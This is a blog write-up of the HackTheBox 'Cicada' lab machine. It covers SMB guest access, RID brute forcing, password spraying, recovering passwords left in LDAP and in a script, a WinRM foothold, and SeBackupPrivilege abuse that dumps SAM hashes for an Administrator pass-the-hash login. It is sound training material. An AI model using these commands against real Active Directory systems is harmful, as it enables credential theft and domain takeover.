<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Cicada</title>
<meta name=description content="Platform: HackTheBox Link: Cicada Level: Easy OS: Windows Cicada is an Active Directory domain controller. We are able to login through SMB using the guest …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-cicada/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Cicada"><meta property="og:description" content="Platform: HackTheBox Link: Cicada Level: Easy OS: Windows Cicada is an Active Directory domain controller. We are able to login through SMB using the guest …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Cicada/Cicada.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Cicada/Cicada.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Cicada"><meta name=twitter:description content="Platform: HackTheBox Link: Cicada Level: Easy OS: Windows Cicada is an Active Directory domain controller. We are able to login through SMB using the guest …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-cicada/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-cicada/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Cicada/Cicada.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-cicada/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-cicada/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Cicada</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>February 13, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: HackTheBox</li><li>Link: <a href=https://app.hackthebox.com/machines/Cicada>Cicada</a></li><li>Level: Easy</li><li>OS: Windows</li></ul><hr><p>Cicada is an Active Directory domain controller. We are able to login through SMB using the guest account, allowing us to retrieve a note containing a password. By performing a RID brute force attack, we enumerate the domain users and discover valid credentials, which we use to authenticate via LDAP. Further enumeration reveals a password stored in a user’s description field, granting access to another SMB share containing a PowerShell script with hardcoded credentials. This enables us to gain an initial foothold on the system. The compromised user possesses the <code>SeBackupPrivilege</code> and is a member of the <code>Backup Operators</code> group, providing two distinct ways to exploit the target.</p><p>Target IP address - <code>10.10.11.35</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -p- -sC -sV -Pn 10.10.11.35
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-12 23:27 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> cicada.htb <span style=color:#56b6c2>(</span>10.10.11.35<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.059s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65523</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2025-01-13 12:32:02Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style=display:flex><span>|_Not valid after:  2025-08-22T20:24:16
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style=display:flex><span>|_Not valid after:  2025-08-22T20:24:16
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style=display:flex><span>|_Not valid after:  2025-08-22T20:24:16
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>57002/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: 7h00m01s
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2025-01-13T12:32:54
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 356.76 seconds
</span></span></code></pre></div><p>Our target is running many services related to Active Directory. Let&rsquo;s update the <code>/etc/hosts</code> file according to the nmap results.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.35 cicada.htb cicada.htb0 CICADA-DC.cicada.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>Let&rsquo;s start with SMB.</p><pre tabindex=0><code>smbclient -N -L cicada.htb
</code></pre><p><img src=/images/HTB-Cicada/smbclient_cmd.png alt="SMB shares list"></p><p>We notice different shares such as <code>HR</code> and <code>DEV</code>. We can try to login in with a guest account in order to find more information.</p><pre tabindex=0><code>netexec smb cicada.htb -u Guest -p &#34;&#34; --shares
</code></pre><p><img src=/images/HTB-Cicada/shares_list.png alt="SMB guest login"></p><p>We can read the shares: <code>HR</code> and <code>IPC$</code> (default share).</p><pre tabindex=0><code>smbclient //cicada.htb/HR
</code></pre><p><img src=/images/HTB-Cicada/HR_share.png alt="HR share content"></p><p>We find a file called <code>Notice from HR.txt</code> and download it. The file contains a password: <code>Cicada$M6Corpb*@Lp#nZp!8</code>.</p><p><img src=/images/HTB-Cicada/notice_from_HR.png alt="Password found in HR share"></p><p>We now need a username, we can hunt some with netexec.</p><pre tabindex=0><code>netexec smb cicada.htb -u guest -p &#39;&#39; --rid-brute
</code></pre><p>We extract the usernames and end up with the following list.</p><p><img src=/images/HTB-Cicada/accounts.png alt="SMB accounts"></p><pre tabindex=0><code>Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
</code></pre><p><img src=/images/HTB-Cicada/usernames.png alt="SMB usernames list"></p><p>We run the password against our username list, and find a match for <code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code>.</p><pre tabindex=0><code>netexec smb cicada.htb -u users.txt -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --continue-on-success
</code></pre><p><img src=/images/HTB-Cicada/creds_match.png alt="SMB credentials match"></p><p>Let&rsquo;s use the new credentials to login via SMB.</p><pre tabindex=0><code>netexec smb cicada.htb -u michael.wrightson -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares
</code></pre><p><img src=/images/HTB-Cicada/micheal_smb.png alt="michael.wrightson available shares"></p><p>This user has access to the <code>NETLOGON</code> and <code>SYSVOL</code> shares on top of the two previous shares we noticed earlier. Unfortunately none of them contains any valuable information.</p><p>Let&rsquo;s try to authenticate via LDAP with the credentials we have.</p><pre tabindex=0><code>netexec ldap cicada.htb -u michael.wrightson -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;
</code></pre><p><img src=/images/HTB-Cicada/LDAP_auth_michael.png alt="LDAP authentication michael.wrightson"></p><p>The credentials are valid! We can obtain more information with <code>ldapdomaindump</code>.</p><pre tabindex=0><code>ldapdomaindump 10.10.11.35 -u &#39;cicada\michael.wrightson&#39; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;
</code></pre><p><img src=/images/HTB-Cicada/ldapdomaindump.png alt=ldapdomaindump></p><p>After opening <code>domain_users.html</code> we notice that <code>david.orelious</code> left his password (<code>aRt$Lp#7t*VQ!3</code>) in the description.</p><p><img src=/images/HTB-Cicada/david_pwd.png alt="david.orelious password found"></p><hr><p>It is also possible to use <code>ldapsearch</code> to get the password.</p><p>We first dump all the information about the domain (<strong>A LOT OF OUTPUT</strong>).</p><pre tabindex=0><code>ldapsearch -H ldap://cicada.htb -D &#39;michael.wrightson@cicada.htb&#39; -w &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -b &#39;dc=cicada,dc=htb&#39;
</code></pre><p>This command will display all the user names on the domain.</p><pre tabindex=0><code>ldapsearch -H ldap://cicada.htb -D &#39;michael.wrightson@cicada.htb&#39; -w &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -b &#39;dc=cicada,dc=htb&#39; &#34;(objectClass=person)&#34; | grep &#34;sAMAccountName:&#34;
</code></pre><p><img src=/images/HTB-Cicada/ldapsearch_domain_names.png alt="ldapsearch finds domain names"></p><p>We attempt to find some passwords with the command below.</p><pre tabindex=0><code>ldapsearch -H ldap://cicada.htb -D &#39;michael.wrightson@cicada.htb&#39; -w &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -b &#39;dc=cicada,dc=htb&#39; | grep pass
</code></pre><p><img src=/images/HTB-Cicada/ldapsearch_pwdfind.png alt="ldapsearch finds passwords"></p><p>Then we run the list of users against the new password found.</p><pre tabindex=0><code>netexec smb cicada.htb -u users.txt -p &#39;aRt$Lp#7t*VQ!3&#39; --continue-on-success
</code></pre><p><img src=/images/HTB-Cicada/pwd_match.png alt="ldap password match"></p><p>We now know that the password <code>aRt$Lp#7t*VQ!3</code> belong to <code>david.orelious</code>.</p><hr><p>With these new credentials we enumerate SMB once more.</p><pre tabindex=0><code>netexec smb cicada.htb -u david.orelious -p &#39;aRt$Lp#7t*VQ!3&#39; --shares
</code></pre><p><img src=/images/HTB-Cicada/david_smb.png alt="david.orelious available shares"></p><p>This user has access to the <code>DEV</code> share.</p><pre tabindex=0><code>smbclient //cicada.htb/DEV -U david.orelious
</code></pre><p><img src=/images/HTB-Cicada/DEV_share.png alt="DEV share accessed"></p><p>The <code>DEV</code> share contains a file called <code>Backup_script.ps1</code> which we download. Its content is below:</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PowerShell data-lang=PowerShell><span style=display:flex><span><span style=color:#e06c75>$sourceDirectory</span> = <span style=color:#98c379>&#34;C:\smb&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$destinationDirectory</span> = <span style=color:#98c379>&#34;D:\Backup&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$username</span> = <span style=color:#98c379>&#34;emily.oscars&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$password</span> = <span style=color:#e5c07b>ConvertTo-SecureString</span> <span style=color:#98c379>&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> <span style=color:#e06c75>-AsPlainText</span> <span style=color:#e06c75>-Force</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$credentials</span> = <span style=color:#e5c07b>New-Object</span> <span style=color:#e06c75>System</span>.<span style=color:#e06c75>Management</span>.<span style=color:#e06c75>Automation</span>.<span style=color:#e06c75>PSCredential</span>(<span style=color:#e06c75>$username</span>, <span style=color:#e06c75>$password</span>)
</span></span><span style=display:flex><span><span style=color:#e06c75>$dateStamp</span> = <span style=color:#e5c07b>Get-Date</span> <span style=color:#e06c75>-Format</span> <span style=color:#98c379>&#34;yyyyMMdd_HHmmss&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$backupFileName</span> = <span style=color:#98c379>&#34;smb_backup_</span><span style=color:#e06c75>$dateStamp</span><span style=color:#98c379>.zip&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$backupFilePath</span> = <span style=color:#e5c07b>Join-Path</span> <span style=color:#e06c75>-Path</span> <span style=color:#e06c75>$destinationDirectory</span> <span style=color:#e06c75>-ChildPath</span> <span style=color:#e06c75>$backupFileName</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>Compress-Archive</span> <span style=color:#e06c75>-Path</span> <span style=color:#e06c75>$sourceDirectory</span> <span style=color:#e06c75>-DestinationPath</span> <span style=color:#e06c75>$backupFilePath</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>Write-Host</span> <span style=color:#98c379>&#34;Backup completed successfully. Backup file saved to: </span><span style=color:#e06c75>$backupFilePath</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><h2 id=shell-as-emilyoscars>Shell as emily.oscars</h2><p>The script has the password (<code>Q!3@Lp#M6b*7t*Vt</code>) of <code>emily.oscars</code>. With the result of our nmap scan we can see that winrm is running on port 5985. So let&rsquo;s check if we can login with it.</p><p>Make a list with the three passwords we have so far and run it against the user names list.</p><pre tabindex=0><code>netexec winrm cicada.htb -u users.txt -p passwords.txt
</code></pre><p><img src=/images/HTB-Cicada/winrm_valid.png alt="WinRM valid credentials"></p><p><code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code> are the only valid credentials.</p><pre tabindex=0><code>evil-winrm -i cicada.htb -u emily.oscars -p &#39;Q!3@Lp#M6b*7t*Vt&#39;
</code></pre><p><img src=/images/HTB-Cicada/foothold.png alt="emily.oscars WinRM login"></p><p>The user flag is readable at <code>C:\Users\emily.oscars.CICADA\Desktop\user.txt</code>.</p><p>We can see that <code>emily.oscars</code> has the <code>SeBackupPrivilege</code> and with <code>net user emily.oscars</code> we learn that she is a member of the <code>Backup Operators</code> group.</p><blockquote><p>While members of the <strong>Backup Operators group</strong> are inherently granted the <strong>SeBackupPrivilege</strong> by default, the reverse is not always true. A user can have the <strong>SeBackupPrivilege</strong> without being a member of the <strong>Backup Operators</strong> group because privileges in Windows can be assigned explicitly to users or groups independently of group membership.</p></blockquote><p><img src=/images/HTB-Cicada/backup_operators_group.png alt="emily.oscars group membership"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>Because the current user we control has the <code>SeBackupPrivilege</code> and is a member of the <code>Backup Operators group</code> we can access the root flag via two different methods.</p><h3 id=hash-dump-method>Hash Dump method</h3><p>This <a href=https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/>article</a> demonstrates how to abuse <code>SeBackupPrivilege</code>.</p><p>Within the <code>emily.oscars</code> shell execute the following commands</p><pre tabindex=0><code>mkdir Temp
</code></pre><p><img src=/images/HTB-Cicada/Temp_dir.png alt="Temp directory creation"></p><pre tabindex=0><code>reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
</code></pre><p><img src=/images/HTB-Cicada/sam_&_system.png alt="SAM & SYSTEM registries"></p><pre tabindex=0><code>cd Temp
download sam
download system
</code></pre><p><img src=/images/HTB-Cicada/dl_files.png alt="Registry files download"></p><p>On our local machine we dump the admin hash with the following command.</p><pre tabindex=0><code>impacket-secretsdump -sam sam -system system local
</code></pre><p><img src=/images/HTB-Cicada/hash_dump.png alt="impacket hash dump"></p><blockquote><p><code>pypykatz</code> can also be used to dump the hashes with the command <code>pypykatz registry --sam sam system</code>.</p></blockquote><p>We can now login as the Administrator and read the root flag.</p><pre tabindex=0><code>evil-winrm -i cicada.htb -u Administrator -H &#39;2b87e7c93a3e8a0ea4a581937016f341&#39;
</code></pre><p><img src=/images/HTB-Cicada/root_flag.png alt="Administrator login via EvilWinRM"></p><h3 id=local-attack>Local Attack</h3><p>You can also use the method described <a href=https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators>here</a>. You will need to go to <a href=https://github.com/giuliano108/SeBackupPrivilege>this</a> Github repo to get <code>SeBackupPrivilegeUtils.dll</code> and <code>SeBackupPrivilegeCmdLets.dll</code>.</p><ol><li>After cloning the repo we send the files to the target via our evil-winrm shell.</li></ol><pre tabindex=0><code>upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
</code></pre><p><img src=/images/HTB-Cicada/SeBackup_files.png alt="SeBackup files"></p><ol start=2><li>Import the libraries</li></ol><pre tabindex=0><code>Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
</code></pre><p><img src=/images/HTB-Cicada/Modules_Import.png alt="Modules Import"></p><ol start=3><li>Copy the root flag</li></ol><pre tabindex=0><code>Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\Documents\root.txt
</code></pre><p><img src=/images/HTB-Cicada/copy_root_flag.png alt="root flag copied"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/thm-you-got-mail/>&#8592;
Previous:
THM: You Got Mail</a></p><p class=prev-post-date>February 9, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#shell-as-emilyoscars>Shell as emily.oscars</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#hash-dump-method>Hash Dump method</a></li><li><a href=#local-attack>Local Attack</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>